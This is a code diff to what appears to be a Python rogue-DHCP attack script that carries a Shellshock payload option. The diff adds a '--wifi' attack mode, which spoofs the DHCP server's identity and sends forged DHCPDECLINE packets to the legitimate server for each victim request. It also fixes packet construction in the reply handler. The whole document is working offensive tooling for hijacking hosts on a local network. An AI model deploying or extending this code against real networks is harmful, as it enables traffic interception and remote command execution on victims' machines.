@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 from base import Base
 from network import Ethernet_raw, DHCP_raw
 from sys import exit
@@ -34,6 +36,7 @@ parser.add_argument('-O', '--shellshock_option_code', type=int,
 parser.add_argument('--ip_path', type=str, help='Set path to "ip" command, default = /bin/', default="/bin/")
 parser.add_argument('--iface_name', type=str, help='Set iface name, default = eth0', default="eth0")
 
+parser.add_argument('--wifi', help='WiFi attack', action='store_true')
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
@@ -64,6 +67,14 @@ proxy = None
 domain = None
 payload = None
 
+if args.wifi:
+    if args.dhcp_mac is None:
+        print "Please set DHCP server MAC address ( --dhcp_mac '00:aa:bb:cc:dd:ee')"
+        exit(1)
+    if args.dhcp_ip is None:
+        print "Please set DHCP server IP address ( --dhcp_ip '192.168.1.1')"
+        exit(1)
+
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
 else:
@@ -89,12 +100,12 @@ if your_broadcast is None:
     print "Network interface: " + current_network_interface + " do not have broadcast!"
     exit(1)
 
-if args.dhcp_mac is None:
+if args.dhcp_mac is None or args.wifi:
     dhcp_server_mac_address = your_mac_address
 else:
     dhcp_server_mac_address = args.dhcp_mac
 
-if args.dhcp_ip is None:
+if args.dhcp_ip is None or args.wifi:
     dhcp_server_ip_address = your_ip_address
 else:
     dhcp_server_ip_address = args.dhcp_ip
@@ -237,6 +248,7 @@ def dhcp_reply(request):
             dhcp_options = option_operation + option_server_id + option_netmask + option_domain + option_router + \
                            option_dns + option_end
 
+            dhcp = DHCP_raw()
             ack_packet = dhcp.make_packet(ethernet_src_mac=dhcp_server_mac_address,
                                           ethernet_dst_mac=target_mac_address,
                                           ip_src=dhcp_server_ip_address,
@@ -321,6 +333,18 @@ def dhcp_reply(request):
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                 SOCK.send(ack_packet)
                 print "[INFO] Send ack response!"
+
+            if args.wifi:
+                dhcp = DHCP_raw()
+                decline_packet = dhcp.make_decline_packet(client_mac=target_mac_address,
+                                                          requested_ip=requested_ip,
+                                                          transaction_id=transaction_id,
+                                                          relay_mac=your_mac_address,
+                                                          relay_ip=your_ip_address,
+                                                          server_ip=args.dhcp_ip,
+                                                          server_mac=args.dhcp_mac)
+                SOCK.send(decline_packet)
+                print "[INFO] Send decline request from: " + str(requested_ip) + " to: " + str(args.dhcp_ip)
 
         SOCK.close()
 
